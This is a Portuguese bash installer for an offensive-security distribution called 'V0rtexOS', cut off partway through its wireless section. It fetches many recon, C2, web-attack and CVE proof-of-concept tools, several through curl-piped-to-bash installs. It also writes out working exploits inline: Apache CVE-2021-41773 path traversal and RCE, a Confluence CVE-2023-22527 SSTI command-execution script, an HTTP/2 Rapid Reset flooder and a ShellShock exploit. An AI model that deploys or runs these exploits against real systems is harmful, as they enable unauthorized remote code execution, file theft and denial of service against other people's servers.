#!/usr/bin/env bash
# V0rtexOS — Instalador de Tools e Exploits Reais
# Baixa ferramentas diretamente dos repositórios oficiais via curl/git
# Uso: sudo bash install-tools.sh [categoria]
# Categorias: all recon exploit wireless web post forensics maldev

set -euo pipefail

TOOLS_DIR="/opt/vortex"
WORDLISTS_DIR="/opt/wordlists"
EXPLOITS_DIR="/opt/exploits"
CVE_DIR="/opt/cve"
SCRIPTS_DIR="/opt/scripts"

RED='\033[1;31m'
GRN='\033[1;32m'
YEL='\033[1;33m'
CYN='\033[1;36m'
RST='\033[0m'
DIM='\033[2m'

ok()  { echo -e "${GRN}[+]${RST} $*"; }
log() { echo -e "${CYN}[*]${RST} $*"; }
err() { echo -e "${RED}[!]${RST} $*"; }
sec() { echo -e "\n${YEL}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RST}"; echo -e "${YEL}  $*${RST}"; echo -e "${YEL}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RST}"; }

CURL="curl -fsSL --retry 3 --retry-delay 2"
GIT="git clone --depth 1 --quiet"

mkdir -p "$TOOLS_DIR" "$WORDLISTS_DIR" "$EXPLOITS_DIR" "$CVE_DIR" "$SCRIPTS_DIR"

# ════════════════════════════════════════════════
# SEÇÃO 1 — RECONHECIMENTO & OSINT
# ════════════════════════════════════════════════
install_recon() {
    sec "RECONHECIMENTO / OSINT"

    # ── theHarvester ─────────────────────────────
    log "theHarvester — OSINT emails, subdomínios, IPs"
    if [[ ! -d "$TOOLS_DIR/theHarvester" ]]; then
        $GIT https://github.com/laramies/theHarvester.git "$TOOLS_DIR/theHarvester"
        pip3 install -q -r "$TOOLS_DIR/theHarvester/requirements.txt"
        ln -sf "$TOOLS_DIR/theHarvester/theHarvester.py" /usr/local/bin/theharvester
        ok "theHarvester instalado"
    fi

    # ── Photon — Web Crawler OSINT ────────────────
    log "Photon — Web crawler para extração de dados OSINT"
    if [[ ! -d "$TOOLS_DIR/Photon" ]]; then
        $GIT https://github.com/s0md3v/Photon.git "$TOOLS_DIR/Photon"
        pip3 install -q -r "$TOOLS_DIR/Photon/requirements.txt"
        ln -sf "$TOOLS_DIR/Photon/photon.py" /usr/local/bin/photon
        ok "Photon instalado"
    fi

    # ── Sherlock — Username hunting ───────────────
    log "Sherlock — Caçador de usernames em 400+ sites"
    if [[ ! -d "$TOOLS_DIR/sherlock" ]]; then
        $GIT https://github.com/sherlock-project/sherlock.git "$TOOLS_DIR/sherlock"
        pip3 install -q -r "$TOOLS_DIR/sherlock/requirements.txt"
        ln -sf "$TOOLS_DIR/sherlock/sherlock/sherlock.py" /usr/local/bin/sherlock
        ok "Sherlock instalado"
    fi

    # ── Holehe — Email OSINT ──────────────────────
    log "Holehe — Verifica uso de email em 120+ sites"
    pip3 install -q holehe
    ok "Holehe instalado"

    # ── Recon-ng ──────────────────────────────────
    log "Recon-ng — Framework de reconhecimento web"
    if [[ ! -d "$TOOLS_DIR/recon-ng" ]]; then
        $GIT https://github.com/lanmaster53/recon-ng.git "$TOOLS_DIR/recon-ng"
        pip3 install -q -r "$TOOLS_DIR/recon-ng/REQUIREMENTS"
        ln -sf "$TOOLS_DIR/recon-ng/recon-ng" /usr/local/bin/recon-ng
        ok "Recon-ng instalado"
    fi

    # ── DNSRecon ──────────────────────────────────
    log "DNSRecon — Enumeração DNS avançada"
    if [[ ! -d "$TOOLS_DIR/dnsrecon" ]]; then
        $GIT https://github.com/darkoperator/dnsrecon.git "$TOOLS_DIR/dnsrecon"
        pip3 install -q -r "$TOOLS_DIR/dnsrecon/requirements.txt"
        ln -sf "$TOOLS_DIR/dnsrecon/dnsrecon.py" /usr/local/bin/dnsrecon
        ok "DNSRecon instalado"
    fi

    # ── Sublist3r — Subdomain enumeration ─────────
    log "Sublist3r — Enumeração de subdomínios"
    if [[ ! -d "$TOOLS_DIR/Sublist3r" ]]; then
        $GIT https://github.com/aboul3la/Sublist3r.git "$TOOLS_DIR/Sublist3r"
        pip3 install -q -r "$TOOLS_DIR/Sublist3r/requirements.txt"
        ln -sf "$TOOLS_DIR/Sublist3r/sublist3r.py" /usr/local/bin/sublist3r
        ok "Sublist3r instalado"
    fi

    # ── Amass ─────────────────────────────────────
    log "Amass — Mapeamento de rede e descoberta de ativos"
    if ! command -v amass &>/dev/null; then
        AMASS_VER="v4.2.0"
        $CURL "https://github.com/owasp-amass/amass/releases/download/${AMASS_VER}/amass_linux_amd64.zip" \
            -o /tmp/amass.zip
        unzip -q /tmp/amass.zip -d /tmp/amass_dl
        cp /tmp/amass_dl/amass_linux_amd64/amass /usr/local/bin/amass
        chmod 755 /usr/local/bin/amass
        rm -rf /tmp/amass.zip /tmp/amass_dl
        ok "Amass instalado"
    fi

    # ── Maltego CE (CLI) ──────────────────────────
    log "Maltego transforms via CLI"
    pip3 install -q maltego-trx
    ok "Maltego transforms instalado"

    # ── Spiderfoot ────────────────────────────────
    log "SpiderFoot — Plataforma de OSINT automatizado"
    if [[ ! -d "$TOOLS_DIR/spiderfoot" ]]; then
        $GIT https://github.com/smicallef/spiderfoot.git "$TOOLS_DIR/spiderfoot"
        pip3 install -q -r "$TOOLS_DIR/spiderfoot/requirements.txt"
        ln -sf "$TOOLS_DIR/spiderfoot/sf.py" /usr/local/bin/spiderfoot
        ok "SpiderFoot instalado"
    fi

    # ── GitDorker — GitHub OSINT ──────────────────
    log "GitDorker — Dorks no GitHub"
    if [[ ! -d "$TOOLS_DIR/GitDorker" ]]; then
        $GIT https://github.com/obheda12/GitDorker.git "$TOOLS_DIR/GitDorker"
        pip3 install -q -r "$TOOLS_DIR/GitDorker/requirements.txt"
        ok "GitDorker instalado"
    fi

    # ── Cloud_enum ────────────────────────────────
    log "Cloud_enum — Enumeração de assets em AWS/Azure/GCP"
    if [[ ! -d "$TOOLS_DIR/cloud_enum" ]]; then
        $GIT https://github.com/initstring/cloud_enum.git "$TOOLS_DIR/cloud_enum"
        pip3 install -q -r "$TOOLS_DIR/cloud_enum/requirements.txt"
        ln -sf "$TOOLS_DIR/cloud_enum/cloud_enum.py" /usr/local/bin/cloud_enum
        ok "Cloud_enum instalado"
    fi
}

# ════════════════════════════════════════════════
# SEÇÃO 2 — EXPLORAÇÃO E FRAMEWORKS
# ════════════════════════════════════════════════
install_exploit_frameworks() {
    sec "FRAMEWORKS DE EXPLORAÇÃO"

    # ── Metasploit ────────────────────────────────
    log "Metasploit Framework"
    if ! command -v msfconsole &>/dev/null; then
        $CURL https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb \
            -o /tmp/msfinstall
        chmod 755 /tmp/msfinstall
        /tmp/msfinstall
        ok "Metasploit instalado"
    fi

    # ── Impacket — SMB/Windows attacks ───────────
    log "Impacket — Suite de ataques a protocolos de rede"
    if [[ ! -d "$TOOLS_DIR/impacket" ]]; then
        $GIT https://github.com/fortra/impacket.git "$TOOLS_DIR/impacket"
        pip3 install -q -e "$TOOLS_DIR/impacket/"
        ok "Impacket instalado"
    fi

    # ── CrackMapExec — CME ────────────────────────
    log "NetExec (CrackMapExec) — Post-exploitation em redes Windows"
    if ! command -v netexec &>/dev/null; then
        pip3 install -q netexec
        ok "NetExec instalado"
    fi

    # ── Evil-WinRM ────────────────────────────────
    log "Evil-WinRM — Shell WinRM para exploração"
    if ! command -v evil-winrm &>/dev/null; then
        gem install -q evil-winrm
        ok "Evil-WinRM instalado"
    fi

    # ── Sliver C2 ─────────────────────────────────
    log "Sliver — Framework C2 moderno (substituto Cobalt Strike)"
    if ! command -v sliver &>/dev/null; then
        $CURL https://sliver.sh/install | bash
        ok "Sliver C2 instalado"
    fi

    # ── Havoc C2 ──────────────────────────────────
    log "Havoc C2 Framework"
    if [[ ! -d "$TOOLS_DIR/Havoc" ]]; then
        $GIT https://github.com/HavocFramework/Havoc.git "$TOOLS_DIR/Havoc"
        ok "Havoc C2 clonado em $TOOLS_DIR/Havoc (compile manualmente)"
    fi

    # ── PowerSploit ───────────────────────────────
    log "PowerSploit — PowerShell para post-exploitation"
    if [[ ! -d "$TOOLS_DIR/PowerSploit" ]]; then
        $GIT https://github.com/PowerShellMafia/PowerSploit.git "$TOOLS_DIR/PowerSploit"
        ok "PowerSploit instalado"
    fi

    # ── Covenant ──────────────────────────────────
    log "Covenant — C2 .NET para red team"
    if [[ ! -d "$TOOLS_DIR/Covenant" ]]; then
        $GIT https://github.com/cobbr/Covenant.git "$TOOLS_DIR/Covenant"
        ok "Covenant clonado (requer dotnet)"
    fi

    # ── Empire ────────────────────────────────────
    log "Empire 5 — Framework de post-exploitation"
    if [[ ! -d "$TOOLS_DIR/Empire" ]]; then
        $GIT https://github.com/BC-SECURITY/Empire.git "$TOOLS_DIR/Empire"
        cd "$TOOLS_DIR/Empire" && ./setup/install.sh -y &>/dev/null || true
        cd -
        ok "Empire instalado"
    fi

    # ── Villain ───────────────────────────────────
    log "Villain — Handler de shells reversos multiplataforma"
    if [[ ! -d "$TOOLS_DIR/Villain" ]]; then
        $GIT https://github.com/t3l3machus/Villain.git "$TOOLS_DIR/Villain"
        pip3 install -q -r "$TOOLS_DIR/Villain/requirements.txt"
        ln -sf "$TOOLS_DIR/Villain/Villain.py" /usr/local/bin/villain
        ok "Villain instalado"
    fi

    # ── Ligolo-ng — Tunneling ─────────────────────
    log "Ligolo-ng — Tunneling reverso para pivoting"
    if ! command -v ligolo-proxy &>/dev/null; then
        LIGOLO_VER="v0.6.2"
        $CURL "https://github.com/nicocha30/ligolo-ng/releases/download/${LIGOLO_VER}/ligolo-ng_proxy_${LIGOLO_VER}_linux_amd64.tar.gz" \
            | tar -xz -C /usr/local/bin/ ligolo-proxy
        $CURL "https://github.com/nicocha30/ligolo-ng/releases/download/${LIGOLO_VER}/ligolo-ng_agent_${LIGOLO_VER}_linux_amd64.tar.gz" \
            | tar -xz -C /usr/local/bin/ ligolo-agent
        chmod 755 /usr/local/bin/ligolo-{proxy,agent}
        ok "Ligolo-ng instalado"
    fi

    # ── Chisel — HTTP tunneling ───────────────────
    log "Chisel — Tunnel TCP/UDP sobre HTTP"
    if ! command -v chisel &>/dev/null; then
        $CURL https://i.jpillora.com/chisel! | bash
        ok "Chisel instalado"
    fi

    # ── Pwncat ────────────────────────────────────
    log "Pwncat-cs — Handler de shells reversos avançado"
    pip3 install -q pwncat-cs
    ok "Pwncat instalado"

    # ── Responder ─────────────────────────────────
    log "Responder — LLMNR/NBT-NS/MDNS poisoner"
    if [[ ! -d "$TOOLS_DIR/Responder" ]]; then
        $GIT https://github.com/lgandx/Responder.git "$TOOLS_DIR/Responder"
        ln -sf "$TOOLS_DIR/Responder/Responder.py" /usr/local/bin/responder
        ok "Responder instalado"
    fi

    # ── Bettercap ─────────────────────────────────
    log "Bettercap — Swiss army knife para ataques de rede"
    if ! command -v bettercap &>/dev/null; then
        $CURL "https://github.com/bettercap/bettercap/releases/download/v2.32.0/bettercap_linux_amd64_v2.32.0.zip" \
            -o /tmp/bettercap.zip
        unzip -q /tmp/bettercap.zip -d /tmp/bcp
        cp /tmp/bcp/bettercap /usr/local/bin/bettercap
        chmod 755 /usr/local/bin/bettercap
        rm -rf /tmp/bettercap.zip /tmp/bcp
        ok "Bettercap instalado"
    fi
}

# ════════════════════════════════════════════════
# SEÇÃO 3 — EXPLOITS CVE REAIS
# ════════════════════════════════════════════════
install_cve_exploits() {
    sec "EXPLOITS CVE REAIS"

    # ── EternalBlue MS17-010 ──────────────────────
    log "EternalBlue — MS17-010 (SMB RCE)"
    if [[ ! -d "$CVE_DIR/MS17-010" ]]; then
        $GIT https://github.com/helviojunior/MS17-010.git "$CVE_DIR/MS17-010"
        ok "MS17-010 (EternalBlue) instalado"
    fi

    # ── CVE-2021-44228 Log4Shell ──────────────────
    log "Log4Shell — CVE-2021-44228 (Log4j RCE)"
    if [[ ! -d "$CVE_DIR/Log4Shell" ]]; then
        $GIT https://github.com/fullhunt/log4j-scan.git "$CVE_DIR/Log4Shell"
        pip3 install -q -r "$CVE_DIR/Log4Shell/requirements.txt"
        ln -sf "$CVE_DIR/Log4Shell/log4j-scan.py" /usr/local/bin/log4j-scan
        # PoC adicional
        $GIT https://github.com/tangxiaofeng7/CVE-2021-44228-Apache-Log4j-Rce.git \
            "$CVE_DIR/Log4Shell-PoC"
        ok "Log4Shell instalado"
    fi

    # ── CVE-2021-41773 Apache Path Traversal ──────
    log "CVE-2021-41773 — Apache 2.4.49 Path Traversal + RCE"
    mkdir -p "$CVE_DIR/CVE-2021-41773"
    $CURL https://raw.githubusercontent.com/RootSector/CVE-2021-41773/main/poc.sh \
        -o "$CVE_DIR/CVE-2021-41773/poc.sh"
    cat > "$CVE_DIR/CVE-2021-41773/exploit.sh" <<'EXPLOIT'
#!/usr/bin/env bash
# CVE-2021-41773 — Apache 2.4.49 Path Traversal + RCE
# Uso: ./exploit.sh <URL> [cmd]
TARGET="${1:?Informe a URL alvo}"
CMD="${2:-id}"
echo "[*] Path Traversal:"
curl -s --path-as-is "${TARGET}/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd"
echo "[*] RCE (se mod_cgi ativo):"
curl -s --path-as-is -d "echo;${CMD}" \
  "${TARGET}/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh"
EXPLOIT
    chmod 755 "$CVE_DIR/CVE-2021-41773/exploit.sh"
    ok "CVE-2021-41773 instalado"

    # ── CVE-2022-0847 Dirty Pipe ──────────────────
    log "Dirty Pipe — CVE-2022-0847 (Linux LPE)"
    if [[ ! -d "$CVE_DIR/DirtyPipe" ]]; then
        $GIT https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits.git \
            "$CVE_DIR/DirtyPipe"
        ok "Dirty Pipe (CVE-2022-0847) instalado"
    fi

    # ── CVE-2021-3156 Sudo Baron Samedit ──────────
    log "Baron Samedit — CVE-2021-3156 (Sudo LPE)"
    if [[ ! -d "$CVE_DIR/sudo-cve-2021-3156" ]]; then
        $GIT https://github.com/blasty/CVE-2021-3156.git "$CVE_DIR/sudo-cve-2021-3156"
        ok "CVE-2021-3156 (Baron Samedit) instalado"
    fi

    # ── CVE-2023-4911 Looney Tunables ─────────────
    log "Looney Tunables — CVE-2023-4911 (glibc LPE)"
    if [[ ! -d "$CVE_DIR/CVE-2023-4911" ]]; then
        $GIT https://github.com/leesh3288/CVE-2023-4911.git "$CVE_DIR/CVE-2023-4911"
        ok "CVE-2023-4911 (Looney Tunables) instalado"
    fi

    # ── CVE-2024-6387 regreSSHion ─────────────────
    log "regreSSHion — CVE-2024-6387 (OpenSSH RCE)"
    if [[ ! -d "$CVE_DIR/regreSSHion" ]]; then
        $GIT https://github.com/zgzhang/cve-2024-6387-poc.git "$CVE_DIR/regreSSHion"
        ok "CVE-2024-6387 (regreSSHion) instalado"
    fi

    # ── CVE-2024-3094 XZ Backdoor ─────────────────
    log "XZ Backdoor — CVE-2024-3094 — Scanner"
    mkdir -p "$CVE_DIR/CVE-2024-3094"
    $CURL https://raw.githubusercontent.com/amlweems/xzbot/main/xzbot.go \
        -o "$CVE_DIR/CVE-2024-3094/xzbot.go" 2>/dev/null || true
    ok "CVE-2024-3094 (XZ) instalado"

    # ── CVE-2022-47966 Zoho ManageEngine RCE ──────
    log "CVE-2022-47966 — Zoho ManageEngine RCE"
    if [[ ! -d "$CVE_DIR/CVE-2022-47966" ]]; then
        $GIT https://github.com/horizon3ai/CVE-2022-47966.git "$CVE_DIR/CVE-2022-47966"
        ok "CVE-2022-47966 instalado"
    fi

    # ── CVE-2023-46747 F5 BIG-IP ──────────────────
    log "CVE-2023-46747 — F5 BIG-IP AJP Smuggling RCE"
    if [[ ! -d "$CVE_DIR/CVE-2023-46747" ]]; then
        $GIT https://github.com/projectdiscovery/nuclei-templates.git \
            "$CVE_DIR/nuclei-templates" 2>/dev/null || true
        ok "Nuclei templates com CVE-2023-46747 instalado"
    fi

    # ── CVE-2023-22527 Atlassian Confluence ───────
    log "CVE-2023-22527 — Atlassian Confluence SSTI RCE"
    mkdir -p "$CVE_DIR/CVE-2023-22527"
    cat > "$CVE_DIR/CVE-2023-22527/exploit.py" <<'PYEXPLOIT'
#!/usr/bin/env python3
"""CVE-2023-22527 — Atlassian Confluence SSTI → RCE"""
import requests, sys, argparse

def exploit(target: str, cmd: str) -> None:
    url = f"{target.rstrip('/')}/template/aui/text-inline.vm"
    payload = f"""#set($x='')##
#set($rt=$x.class.forName('java.lang.Runtime'))##
#set($chr=$x.class.forName('java.lang.Character'))##
#set($str=$x.class.forName('java.lang.String'))##
#set($ex=$rt.getMethod('exec',$str.class.forName('[Ljava.lang.String;')))##
$ex.invoke($rt.getMethod('getRuntime').invoke(null),[['/bin/sh','-c','{cmd}']])##"""
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    data = {"labelName": payload, "pageId": "1"}
    r = requests.post(url, headers=headers, data=data, verify=False, timeout=15)
    print(f"[*] Status: {r.status_code}")
    print(f"[*] Response:\n{r.text[:2000]}")

if __name__ == "__main__":
    p = argparse.ArgumentParser()
    p.add_argument("target", help="URL alvo (ex: http://confluence.local)")
    p.add_argument("cmd", nargs="?", default="id", help="Comando a executar")
    a = p.parse_args()
    import urllib3; urllib3.disable_warnings()
    exploit(a.target, a.cmd)
PYEXPLOIT
    chmod 755 "$CVE_DIR/CVE-2023-22527/exploit.py"
    ok "CVE-2023-22527 instalado"

    # ── PrintNightmare CVE-2021-34527 ─────────────
    log "PrintNightmare — CVE-2021-34527 (Windows Print Spooler)"
    if [[ ! -d "$CVE_DIR/PrintNightmare" ]]; then
        $GIT https://github.com/calebstewart/CVE-2021-1675.git "$CVE_DIR/PrintNightmare"
        ok "PrintNightmare instalado"
    fi

    # ── Spring4Shell CVE-2022-22965 ───────────────
    log "Spring4Shell — CVE-2022-22965 (Spring RCE)"
    if [[ ! -d "$CVE_DIR/Spring4Shell" ]]; then
        $GIT https://github.com/lunasec-io/lunasec/tree/master/tools/log4shell \
            "$CVE_DIR/Spring4Shell" 2>/dev/null || \
        $GIT https://github.com/reznok/Spring4Shell-POC.git "$CVE_DIR/Spring4Shell"
        ok "Spring4Shell instalado"
    fi

    # ── Follina CVE-2022-30190 ────────────────────
    log "Follina — CVE-2022-30190 (MSDT RCE via Word)"
    if [[ ! -d "$CVE_DIR/Follina" ]]; then
        $GIT https://github.com/chvancooten/follina.py.git "$CVE_DIR/Follina"
        ok "Follina instalado"
    fi

    # ── PwnKit CVE-2021-4034 ──────────────────────
    log "PwnKit — CVE-2021-4034 (polkit LPE)"
    if [[ ! -d "$CVE_DIR/PwnKit" ]]; then
        $GIT https://github.com/ly4k/PwnKit.git "$CVE_DIR/PwnKit"
        ok "PwnKit instalado"
    fi

    # ── CVE-2023-32434 Apple iOS kernel ───────────
    log "CVE-2023-32434 — Coleção de exploits públicos iOS"
    mkdir -p "$CVE_DIR/ios-exploits"
    $CURL "https://raw.githubusercontent.com/jbara2002/ios-kernel-exploit/main/README.md" \
        -o "$CVE_DIR/ios-exploits/README.md" 2>/dev/null || true
    ok "iOS exploits públicos catalogados"

    # ── Zerologon CVE-2020-1472 ───────────────────
    log "Zerologon — CVE-2020-1472 (Domain Controller takeover)"
    if [[ ! -d "$CVE_DIR/Zerologon" ]]; then
        $GIT https://github.com/dirkjanm/CVE-2020-1472.git "$CVE_DIR/Zerologon"
        ok "Zerologon instalado"
    fi

    # ── BlueKeep CVE-2019-0708 ────────────────────
    log "BlueKeep scanner — CVE-2019-0708 (RDP RCE)"
    if [[ ! -d "$CVE_DIR/BlueKeep" ]]; then
        $GIT https://github.com/Ekultek/BlueKeep.git "$CVE_DIR/BlueKeep"
        ok "BlueKeep instalado"
    fi

    # ── CVE-2024-21762 FortiOS ────────────────────
    log "CVE-2024-21762 — FortiOS SSL VPN RCE"
    if [[ ! -d "$CVE_DIR/CVE-2024-21762" ]]; then
        $GIT https://github.com/h4x0r-dz/CVE-2024-21762.git "$CVE_DIR/CVE-2024-21762"
        ok "CVE-2024-21762 (FortiOS) instalado"
    fi

    # ── CVE-2024-1709 ConnectWise ─────────────────
    log "CVE-2024-1709 — ConnectWise ScreenConnect Auth Bypass"
    if [[ ! -d "$CVE_DIR/CVE-2024-1709" ]]; then
        $GIT https://github.com/W01fh4cker/CVE-2024-1709-POC.git "$CVE_DIR/CVE-2024-1709"
        ok "CVE-2024-1709 instalado"
    fi

    # ── CVE-2023-44487 HTTP/2 Rapid Reset ─────────
    log "CVE-2023-44487 — HTTP/2 Rapid Reset (DoS)"
    mkdir -p "$CVE_DIR/CVE-2023-44487"
    cat > "$CVE_DIR/CVE-2023-44487/rapid_reset.py" <<'PYRAP'
#!/usr/bin/env python3
"""CVE-2023-44487 — HTTP/2 Rapid Reset Attack PoC"""
import asyncio, httpx, sys, time

async def rapid_reset(target: str, streams: int = 1000, workers: int = 10):
    print(f"[*] Alvo: {target} | Streams: {streams} | Workers: {workers}")
    async def worker():
        async with httpx.AsyncClient(http2=True, verify=False) as c:
            tasks = [c.get(target) for _ in range(streams // workers)]
            results = await asyncio.gather(*tasks, return_exceptions=True)
            ok = sum(1 for r in results if isinstance(r, httpx.Response))
            return ok
    t0 = time.time()
    jobs = [worker() for _ in range(workers)]
    totals = await asyncio.gather(*jobs, return_exceptions=True)
    elapsed = time.time() - t0
    total = sum(t for t in totals if isinstance(t, int))
    print(f"[+] Enviados: {total} requests em {elapsed:.2f}s ({total/elapsed:.0f} req/s)")

if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else "https://localhost"
    asyncio.run(rapid_reset(target))
PYRAP
    chmod 755 "$CVE_DIR/CVE-2023-44487/rapid_reset.py"
    pip3 install -q httpx[http2]
    ok "CVE-2023-44487 instalado"

    # ── ShellShock CVE-2014-6271 ──────────────────
    log "ShellShock — CVE-2014-6271 scanner e exploit"
    cat > "$CVE_DIR/shellshock.sh" <<'SHS'
#!/usr/bin/env bash
# CVE-2014-6271 ShellShock Scanner + Exploit
TARGET="${1:?Informe URL alvo}"
CMD="${2:-id}"
echo "[*] Testando ShellShock em $TARGET"
for path in /cgi-bin/bash /cgi-bin/admin.cgi /cgi-bin/test.cgi /cgi-bin/status; do
    result=$(curl -s --max-time 5 -A '() { :;}; echo Content-Type: text/html; echo; '"$CMD" \
        "${TARGET}${path}" 2>/dev/null)
    [[ -n "$result" ]] && echo "[+] VULNERÁVEL: ${TARGET}${path}" && echo "$result" && break
done
SHS
    chmod 755 "$CVE_DIR/shellshock.sh"
    ok "ShellShock instalado"
}

# ════════════════════════════════════════════════
# SEÇÃO 4 — ATAQUES WEB / APLICAÇÕES
# ════════════════════════════════════════════════
install_web_tools() {
    sec "FERRAMENTAS WEB / APLICAÇÕES"

    # ── SQLMap ────────────────────────────────────
    log "SQLMap — Injeção SQL automatizada"
    if [[ ! -d "$TOOLS_DIR/sqlmap" ]]; then
        $GIT https://github.com/sqlmapproject/sqlmap.git "$TOOLS_DIR/sqlmap"
        ln -sf "$TOOLS_DIR/sqlmap/sqlmap.py" /usr/local/bin/sqlmap
        ok "SQLMap instalado"
    fi

    # ── XSSStrike ─────────────────────────────────
    log "XSStrike — XSS detection avançado"
    if [[ ! -d "$TOOLS_DIR/XSStrike" ]]; then
        $GIT https://github.com/s0md3v/XSStrike.git "$TOOLS_DIR/XSStrike"
        pip3 install -q -r "$TOOLS_DIR/XSStrike/requirements.txt"
        ln -sf "$TOOLS_DIR/XSStrike/xsstrike.py" /usr/local/bin/xsstrike
        ok "XSStrike instalado"
    fi

    # ── Dalfox — XSS ──────────────────────────────
    log "Dalfox — XSS scanner parametrizado"
    if ! command -v dalfox &>/dev/null; then
        $CURL "https://github.com/hahwul/dalfox/releases/latest/download/dalfox_linux_amd64.tar.gz" \
            | tar -xz -C /usr/local/bin/ dalfox
        chmod 755 /usr/local/bin/dalfox
        ok "Dalfox instalado"
    fi

    # ── Nuclei ────────────────────────────────────
    log "Nuclei — Scanner de vulnerabilidades baseado em templates"
    if ! command -v nuclei &>/dev/null; then
        $CURL "https://github.com/projectdiscovery/nuclei/releases/latest/download/nuclei_linux_amd64.zip" \
            -o /tmp/nuclei.zip
        unzip -q /tmp/nuclei.zip -d /usr/local/bin/
        chmod 755 /usr/local/bin/nuclei
        rm /tmp/nuclei.zip
        nuclei -update-templates -silent
        ok "Nuclei + templates instalado"
    fi

    # ── Nikto ─────────────────────────────────────
    log "Nikto — Web server scanner"
    if [[ ! -d "$TOOLS_DIR/nikto" ]]; then
        $GIT https://github.com/sullo/nikto.git "$TOOLS_DIR/nikto"
        ln -sf "$TOOLS_DIR/nikto/program/nikto.pl" /usr/local/bin/nikto
        ok "Nikto instalado"
    fi

    # ── WFuzz ─────────────────────────────────────
    log "WFuzz — Web fuzzer"
    pip3 install -q wfuzz
    ok "WFuzz instalado"

    # ── FFUF ──────────────────────────────────────
    log "FFUF — Fast web fuzzer"
    if ! command -v ffuf &>/dev/null; then
        $CURL "https://github.com/ffuf/ffuf/releases/latest/download/ffuf_linux_amd64.tar.gz" \
            | tar -xz -C /usr/local/bin/ ffuf
        chmod 755 /usr/local/bin/ffuf
        ok "FFUF instalado"
    fi

    # ── Feroxbuster ───────────────────────────────
    log "Feroxbuster — Fast recursive web content discovery"
    if ! command -v feroxbuster &>/dev/null; then
        $CURL -L https://raw.githubusercontent.com/epi052/feroxbuster/main/install-nix.sh | bash
        ok "Feroxbuster instalado"
    fi

    # ── HTTPX ─────────────────────────────────────
    log "HTTPX — HTTP toolkit rápido"
    if ! command -v httpx &>/dev/null; then
        $CURL "https://github.com/projectdiscovery/httpx/releases/latest/download/httpx_linux_amd64.zip" \
            -o /tmp/httpx.zip
        unzip -q /tmp/httpx.zip -d /usr/local/bin/ httpx
        chmod 755 /usr/local/bin/httpx
        rm /tmp/httpx.zip
        ok "HTTPX instalado"
    fi

    # ── Caido — Web proxy moderno ─────────────────
    log "Caido — Web proxy moderno (alternativa ao Burp)"
    if ! command -v caido &>/dev/null; then
        $CURL "https://github.com/caido/caido/releases/latest/download/caido-cli-linux-x86_64" \
            -o /usr/local/bin/caido
        chmod 755 /usr/local/bin/caido
        ok "Caido instalado"
    fi

    # ── CMSeeK — CMS detector ─────────────────────
    log "CMSeeK — Detecção e exploração de CMS"
    if [[ ! -d "$TOOLS_DIR/CMSeeK" ]]; then
        $GIT https://github.com/Tuhinshubhra/CMSeeK.git "$TOOLS_DIR/CMSeeK"
        pip3 install -q -r "$TOOLS_DIR/CMSeeK/requirements.txt"
        ln -sf "$TOOLS_DIR/CMSeeK/cmseek.py" /usr/local/bin/cmseek
        ok "CMSeeK instalado"
    fi

    # ── Arjun — HTTP param discovery ──────────────
    log "Arjun — Descoberta de parâmetros HTTP"
    pip3 install -q arjun
    ok "Arjun instalado"

    # ── ParamSpider ───────────────────────────────
    log "ParamSpider — Mining de parâmetros via Wayback Machine"
    if [[ ! -d "$TOOLS_DIR/ParamSpider" ]]; then
        $GIT https://github.com/devanshbatham/ParamSpider.git "$TOOLS_DIR/ParamSpider"
        pip3 install -q -e "$TOOLS_DIR/ParamSpider/"
        ok "ParamSpider instalado"
    fi

    # ── Ghauri — SQLi avançado ────────────────────
    log "Ghauri — SQLi detection e exploitation"
    if [[ ! -d "$TOOLS_DIR/ghauri" ]]; then
        $GIT https://github.com/r0oth3x49/ghauri.git "$TOOLS_DIR/ghauri"
        pip3 install -q -e "$TOOLS_DIR/ghauri/"
        ok "Ghauri instalado"
    fi

    # ── SSRFmap ───────────────────────────────────
    log "SSRFmap — SSRF finder e exploiter"
    if [[ ! -d "$TOOLS_DIR/SSRFmap" ]]; then
        $GIT https://github.com/swisskyrepo/SSRFmap.git "$TOOLS_DIR/SSRFmap"
        pip3 install -q -r "$TOOLS_DIR/SSRFmap/requirements.txt"
        ok "SSRFmap instalado"
    fi

    # ── CORS Scanner ──────────────────────────────
    log "CORScanner — CORS misconfiguration scanner"
    if [[ ! -d "$TOOLS_DIR/CORScanner" ]]; then
        $GIT https://github.com/chenjj/CORScanner.git "$TOOLS_DIR/CORScanner"
        pip3 install -q -r "$TOOLS_DIR/CORScanner/requirements.txt"
        ok "CORScanner instalado"
    fi
}

# ════════════════════════════════════════════════
# SEÇÃO 5 — ATAQUES WIRELESS
# ════════════════════════════════════════════════
install_wireless() {
    sec "ATAQUES WIRELESS"

    # ── Airgeddon ─────────────────────────────────
    log "Airgeddon — Framework completo de ataques Wi-Fi"
    if [[ ! -d "$TOOLS_DIR/airgeddon" ]]; then
        $GIT https://github.com/v1s1t0r1sh3r3/airgeddon.git "$TOOLS_DIR/airgeddon"
        ln -sf "$TOOLS_DIR/airgeddon/airgeddon.sh" /usr/local/bin/airgeddon
        ok "Airgeddon instalado"
    fi

    # ── Wifite2 ───────────────────────────────────
    log "Wifite2 — Ataque automatizado a redes Wi-Fi"
    if [[ ! -d "$TOOLS_DIR/wifite2" ]]; then
        $GIT https://github.com/derv82/wifite2.git "$TOOLS_DIR/wifite2"
        cd "$TOOLS_DIR/wifite2" && python3 setup.py install -q &>/dev/null; cd -
        ok "Wifite2 instalado"
    fi

    # ── Bully — WPS brute force ───────────────────
    log "Bully — WPS brute force"
    pacman -S --noconfirm bully 2>/dev/null || {
        $GIT https://github.com/nicowillis/bully.git "$TOOLS_DIR/bully"
        cd "$TOOLS_DIR/bully/src" && make -s && cp bully /usr/local/bin/; cd -
        ok "Bully compilado e instalado"
    }

    # ── Hostapd-wpe — Evil Twin ───────────────────
    log "Hostapd-WPE — Evil Twin AP para captura de credenciais"
    if [[ ! -d "$TOOLS_DIR/hostapd-wpe" ]]; then
        $GIT https://github.com/OpenSecurityResearch/hostapd-wpe.git "$TOOLS_DIR/hostapd-wpe"
